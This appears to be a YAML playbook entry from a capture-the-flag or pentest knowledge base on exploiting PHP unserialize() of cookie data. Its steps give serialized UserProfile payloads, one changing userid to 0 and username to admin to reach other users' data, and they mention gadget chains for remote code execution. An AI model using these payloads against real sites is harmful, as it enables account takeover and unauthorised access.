name: php_deserialization_cookie
category: web
tags: [deserialization, php, unserialize, cookie]
indicators:
  - "unserialize() on user input"
  - "Cookie containing serialized data"
  - "Base64 encoded cookie"
  - "UserProfile or similar class"

tricks:
  - name: "Step 1: Identify deserialization"
    when: "Found unserialize() on cookie data"
    how: "Check cookie format and decode"
    payload: |
      # PHP serialized format: O:11:"UserProfile":2:{...}
      # Base64 encoded in cookie

  - name: "Step 2: Create malicious object"
    when: "Confirmed unserialize vulnerability"
    how: "Serialize malicious object"
    payload: |
      # PHP serialized UserProfile
      O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:8:"testuser";}
      # Base64 encode for cookie

  - name: "Step 3: Exploit with different userid"
    when: "Need to access other users' data"
    how: "Modify userid in serialized object"
    payload: |
      # Change userid to access secret note
      O:11:"UserProfile":2:{s:6:"userid";i:0;s:8:"username";s:8:"admin";}

  - name: "Alternative: PHP gadget chains"
    when: "Need RCE"
    how: "Use PHP deserialization gadgets"
    payload: |
      # If available, use POP chains
      # Common: __destruct, __wakeup magic methods
      # Look for classes with file operations

